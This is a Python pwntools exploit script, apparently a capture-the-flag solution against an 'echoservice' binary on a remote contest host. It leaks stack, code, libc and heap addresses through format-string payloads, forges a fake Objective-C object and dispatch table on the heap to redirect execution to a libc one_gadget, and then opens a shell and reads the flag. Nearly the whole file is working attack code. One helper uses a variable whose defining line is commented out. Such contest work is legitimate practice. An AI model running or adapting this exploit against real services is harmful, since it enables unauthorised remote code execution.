#!/usr/bin/env python2

import sys
import argparse
import binascii
from pwn import *

# python solution.py -e remote ./echoservice -i echo.stillhackinganyway.nl -p 1337
# You need the binary (echoservice) in the same directory
# You need the libc (libc6_2.23-0ubuntu9_amd64.so) with hash 885acc6870b8ba98983e88e578179a2c
def leak_heap():
    lookup = "CORB3NIK"
    payload =  lookup + "%4$p"
    p.sendline(payload)
    p.recvuntil(lookup)
    heap_addr = int(p.recvline().strip()[2:], 16)
    return heap_addr

def create_heap_chunk(data):
    lookup = "CORB3NIK"
    payload = "%4$p" + "CORB" + data
    payload += "\x00" * (0x100 - len(payload))
    p.sendline(payload)
    #leak = p.recvuntil("CORB", drop=True).split(" ", 3)[-1].rjust(8, "\x00")
    heap_hint = int(leak, 16)
    p.clean()
    return heap_hint

def leak_addr(addr):
    p.clean()
    p.sendline("%13$SCOR" + p64(addr))
    leak = p.recvuntil("COR", drop=True).split(" ", 3)[-1]
    decoded = leak.decode('utf8')
    leak = ""
    for c in decoded:
      upper = (ord(c) & 0xff00) >> 8
      lower = ord(c) & 0xff
      leak += chr(lower) + chr(upper)

    leak += "\x00"
    p.clean()
    return leak

def exploit():

    # Leak stack
    p.sendline("%142$p")
    stack = int(p.recvline().split(" ", 3)[-1], 16)
    log.info("Stack : 0x%x" % stack)

    # Leak binary
    code = u64(leak_addr(stack).ljust(8, "\x00"))
    log.info("Code segment : 0x%x" % code)

    # Leak libc
    #libc = u64(leak_addr(stack + 8).ljust(8, "\x00"))
    #log.info("Libc : 0x%x" % libc)

    # Leak fgets GOT
    fgets = u64(leak_addr(code + 2100560).ljust(8, "\x00"))
    log.info("fgets() : 0x%x" % fgets)

    # Leak __libc_start_main GOT
    # LIBC SEEMS TO BE libc6_2.23-0ubuntu9_amd64
    #__libc_start_main = u64(leak_addr(code + 2100592).ljust(8, "\x00"))
    #log.info("__libc_start_main() : 0x%x" % __libc_start_main)

    # Calculate libc base + one_gadget
    base = fgets - 0x6dad0
    one_gadget = base + 0x4526a
    log.info("one_gadget should be at : 0x%x" % one_gadget)

    # Leak Heap
    heap = u64(leak_addr(base+0x3c48e8).ljust(8, '\x00'))
    log.info("heap : 0x%x" % heap)

    ### Actual WORKING exploit ###
    ### Two values need to be changed, scroll down.

    # Setup fake objc_object pointer
    next_chunk = heap + 247 # <==== Change the second value here
    dtable =  next_chunk + 0x100
    bucket_pointers = dtable + 0x50
    buckets = bucket_pointers + 0x100
    log.info("Next heap chunk : 0x%x" % next_chunk)

    payload = ""
    payload += "\x00" * 0x108 # padding

    # objc_class struct start
    payload += p64(next_chunk)
    payload += "R" * 0x38 # useless
    payload += p64(dtable) # struct sarray* dtable value
    payload += "R" * 0xb8
    log.info("dtable : 0x%x" % dtable)

    # dtable start
    payload += p64(bucket_pointers) # struct sbucket** bucket_pointers
    payload += "R" * 0x20
    payload += p64(0x1337) # dtable size?
    payload += "R" * 0x20
    log.info("Bucket pointers : 0x%x" % bucket_pointers)

    # bucket pointer list
    payload += p64(0x1337) * 0x3
    payload += p64(buckets) # bucket pointer
    payload += p64(0x1337) * 0x0f
    payload += "R" * 0x68
    log.info("Buckets : 0x%x" % bucket_pointers)

    # bucket list
    payload += p64(one_gadget) * 0x14 # <==== Change this for 1337 RIP controle

    payload += "R" * (0x350 - len(payload))
    p.sendline(payload)
    p.recvline()

    ## TESTING ##
    #print  repr(leak_addr(next_chunk))
    #print  repr(leak_addr(next_chunk+0x40))

    #payload = "%13$p" + "AAA" + p64(next_chunk+8) # DEBUG
    payload = "%13$@" + "AAA" + p64(next_chunk)
    p.sendline(payload)
    p.sendline("cat /flag")
    p.interactive()

if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary], env={"LD_PRELOAD":"./libc6_2.23-0ubuntu9_amd64.so"})
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(args.i, args.p)

    pause()
    exploit()
